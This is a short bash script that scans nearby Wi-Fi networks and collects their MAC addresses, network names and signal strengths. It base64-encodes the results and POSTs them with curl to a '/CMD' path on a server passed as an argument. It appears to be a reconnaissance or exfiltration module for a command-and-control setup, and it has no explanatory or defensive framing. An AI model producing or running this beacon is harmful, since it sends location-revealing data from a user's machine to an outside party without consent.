#!/bin/bash

wireless_data=$(iwlist scan 2>&1 | egrep 'Address|ESSID|Signal')
post_data="os=linux&data=$(echo "$wireless_data" | base64 -w 0)"

curl -d "$post_data" "$1/CMD"
